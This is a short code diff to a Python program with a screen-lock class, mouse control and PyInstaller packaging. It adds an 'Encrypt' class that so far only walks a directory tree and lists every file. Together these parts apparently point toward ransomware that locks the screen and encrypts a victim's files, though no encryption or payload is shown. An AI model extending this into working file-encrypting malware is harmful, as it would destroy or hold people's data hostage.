@@ -11,6 +11,19 @@ from pynput.mouse import Controller
 from PIL import Image, ImageTk
 import PyInstaller.__main__
 
+class Encrypt:
+    def __init__(self):
+        pass
+
+    def get_files(self, path):
+
+        for element in os.listdir(path):
+            element_path = os.path.join(path, element)
+            if os.path.isfile(element_path):
+                yield element_path
+            elif os.path.isdir(element_path):
+                yield from self.get_files(element_path)
+
 
 class ScreenLock:
     def __init__(self, duration, name, background, password=None):
